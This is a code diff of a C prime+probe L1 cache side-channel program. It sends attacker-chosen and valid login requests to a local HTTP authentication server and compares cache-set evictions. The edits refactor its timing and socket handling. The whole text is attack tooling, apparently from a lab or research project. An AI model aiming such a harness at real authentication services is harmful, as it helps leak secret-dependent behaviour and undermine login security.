@@ -21,7 +21,7 @@
 
 
 // prime+probe
-#define TRAINING_REPS 20
+#define TRAINING_REPS 50
 #define ATTACK_RUNS 10000
 #define BASELINE_RUNS 10000
 #define EVICTION_THRESHOLD 0
@@ -36,9 +36,14 @@ uint8_t probe_array[L1_SIZE] __attribute__((aligned(4096))); // allocates int ar
 uint64_t c_threshold;
 int shuffle_arr[SETS];
 
+
+
 int main(int argc, char* argv[]) {
      // setup socket connection 
     int clientfd;
+    struct sockaddr_in servaddr;
+    open_socket(&clientfd, &servaddr);
+    connect(clientfd, (struct sockaddr *)&servaddr, sizeof(servaddr));
 
     // shuffle prob arr access route - avoid hardwre prefetching
     for (int i = 0; i < SETS; i++) {
@@ -61,33 +66,21 @@ int main(int argc, char* argv[]) {
     "Host: 127.0.0.1\r\n"
     "Content-Length: 37\r\n"
     "Content-Type: application/x-www-form-urlencoded\r\n"
+    "Connection: keep-alive\r\n"
     "\r\n"
     "username=user1&password=password&id=0";
     char attack_data[256];
     get_inputs(attack_data, argc, argv);
     
 
-    // set up curl 
-    /* curl_global_init(CURL_GLOBAL_ALL);
-    curl_handle = curl_easy_init();
-    if (curl_handle){
-        curl_easy_setopt(curl_handle, CURLOPT_URL, "http://127.0.0.1:8080/token-auth/");
-        curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_junk);
-    } */
-
-    //  ==================== PRIME + PROBE ===================
-    //int top_sets[SETS] = {0};
-
 
     // generates baseline set
     int baseline[SETS] = {0};    
     for(int i = 0; i < BASELINE_RUNS; i++){
-        prime_cache();
-
-        make_request(valid_data, &clientfd); // send valid credentials
-
-        // adds to count to calculate baseline
-        check_cache_presence(baseline);
+        for(int i = 0; i < TRAINING_REPS; i++){
+            make_request(valid_data, &clientfd);
+        }
+        primeprobe(valid_data, &clientfd, baseline);
     }
 
     int count[SETS] = {0}; // records sets that have been touched
@@ -100,21 +93,18 @@ int main(int argc, char* argv[]) {
         }
             
     
-        prime_cache(); // prime L1 with probe array
-
-        _mm_mfence(); // wait for prime to compelte before sending bad request
-        // cache check 
-        make_request(attack_data, &clientfd);
-        _mm_mfence();
-
-        check_cache_presence(count);
+        primeprobe(attack_data, &clientfd, count);
     } 
+
+
+
     printf("\n===== Eviction Difs =====\n");
     for (int i = 0; i < SETS; i++) { 
         int diff = count[i] - baseline[i];
         printf("Set %d: +%d -> (attack: %d, baseline: %d)\n", i, diff, count[i], baseline[i]); // print diff
     }
     //curl_easy_cleanup(curl_handle);
+    close(clientfd);
     return 0;
 
 }
@@ -135,7 +125,8 @@ void prime_cache(){
         // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
         for (unsigned int i = 0; i < SETS; i++){
             for(unsigned int w = 0; w < WAYS; w++){ // primes each way
-                probe_array[shuffle_arr[i] * LINE_SIZE + (w * 4096)] = 0;
+                volatile uint8_t tmp; 
+                tmp =  probe_array[shuffle_arr[i] * LINE_SIZE + (w * 4096)]; // forces load
             }
         }
     }
@@ -173,6 +164,22 @@ void check_cache_presence(int *count){
     // printf("%d/%d cache hits\n", present, NO_LINES);
 }
 
+
+void primeprobe(char *data, int *clientfd, int *results) {
+    prime_cache(); // prime L1 with probe array
+    _mm_mfence(); // wait for prime to compelte before sending bad request
+
+    send(*clientfd, data, strlen(data), 0);
+
+    // cache check 
+    _mm_lfence();
+
+    check_cache_presence(results);
+
+    char buf[1024];
+    recv(*clientfd, buf, sizeof(buf), 0); 
+    _mm_mfence();
+}
 
 // finds hit and miss time  -need to implement loop to find avg + determine cache threshold
 volatile int test_data = 2;
@@ -232,14 +239,10 @@ int cache_threshold(){
 void make_request(char *data, int *clientfd){
     // curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);
     // curl_easy_perform(curl_handle); 
-    struct sockaddr_in servaddr;
-    open_socket(clientfd, &servaddr);
-    connect(*clientfd, (struct sockaddr *)&servaddr, sizeof(servaddr));
     send(*clientfd, data, strlen(data), 0);
     char buf[256];
-    recv(*clientfd, buf, 256, MSG_DONTWAIT);
-    close(*clientfd);
-
+    recv(*clientfd, buf, 256, 0);
+    _mm_lfence();
 }
 
 // returns junk so that curl doesnt write to console
@@ -265,7 +268,7 @@ void get_inputs(char attack_data[], int argc, char* argv[]){
         "Host: 127.0.0.1\r\n"
         "Content-Length: %d\r\n"
         "Content-Type: application/x-www-form-urlencoded\r\n"
-        "Connection: close\r\n\r\n"
+        "Connection: keep-alive\r\n\r\n"
         "%s", body_len, body);
 }
 
